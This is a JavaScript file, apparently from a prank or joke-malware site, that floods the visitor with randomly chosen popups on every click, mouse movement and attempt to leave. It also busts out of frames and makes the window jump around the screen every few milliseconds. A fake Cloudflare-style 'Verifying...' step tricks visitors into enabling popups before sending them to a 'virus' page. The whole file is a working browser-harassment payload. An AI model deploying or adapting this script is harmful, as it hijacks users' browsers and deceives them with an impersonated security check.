/*
Huge thanks to MalwarePad (https://malwarepad.com) for the majority of the code!
*/

if (top.location != location) {
  top.location.href = location.href;
}

function openWhite() {
  window.open(
    "popup-white.html",
    "",
    "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
  );
}

function openBlack() {
  window.open(
    "popup-black.html",
    "",
    "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
  );
}

function reopen() {
  const functions = [openWhite, openBlack];
  const random = Math.floor(Math.random() * functions.length);
  functions[random]();
}

function spam() {
  for (var i = 0; i < 3; i++) {
    reopen();
  }
}

function init() {
  if (checkCookie()) {
    return;
  }

  document.body.onclick = reopen;
  document.body.onmouseover = reopen;
  document.body.onmousemove = reopen;
  window.onbeforeunload = spam;
  playBall();
  reopen();
}

var xOff = 5,
  yOff = 5,
  xPos = 400,
  yPos = -100;

function playBall() {
  xPos = Math.ceil(Math.random() * screen.width);
  yPos = Math.ceil(Math.random() * screen.height);

  window.moveTo(xPos, yPos);
  setTimeout(playBall, 3);
}

function addCookie() {
  document.cookie = "antiomv=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/";
}

function checkCookie() {
  const cookies = document.cookie.split('; ').reduce((acc, cur) => {
    const [key, val] = cur.split('=');
    acc[key] = val;
    return acc;
  }, {});

  let antiomvBool = cookies["antiomv"] === "true";
  let path = window.location.pathname;

  if (antiomvBool) { 
    if (path === "/popup-white.html" || path === "/popup-black.html") {
      window.close();
    } else {
      window.location.href = "./antivirus.html";
    }

    return true;
  }

  return false;
}

function popupPrompt() {
  checkCookie();

  const popups = [];

  for (let i = 0; i < 3; i++) {
    const popup = window.open("https://cloudflare.com/popuptest?=hD3UMay0orTnzvfYQPBeoobhnvucEztt63gahzvqy968xPSs9qxigpdT8u52Omt0nuvtDL1LY3jrrIkxb8BBHJMaFGQrOMcR7iK8wZFLbcIXK2jUfUXCU61Ow11fFMFv", "", "width=1,height=1,left=-1000,top=-1000");
    popups.push(popup);
  }

  const blocked = popups.some(popup => popup === null || typeof popup === "undefined");

  if (blocked) {
    popups.forEach(popup => {
      if (popup && !popup.closed) popup.close();
    });

    setTimeout(function () {
      const changeElement = document.getElementById("change");
      if (changeElement) {
        changeElement.textContent = "Verifying...";
      }
    }, 300);

    setTimeout(function () {
      const changeElement = document.getElementById("change");
      const changeElement2 = document.getElementById("cloudflaremsg");
      if (changeElement) {
        changeElement.textContent = "Enable popups to continue.";
      }
      if (changeElement2) {
        changeElement2.style.display = "block";
      }
    }, 2000);
  } else {
    popups.forEach(popup => popup.close());
    window.location.href = "./virus.html";
  }
}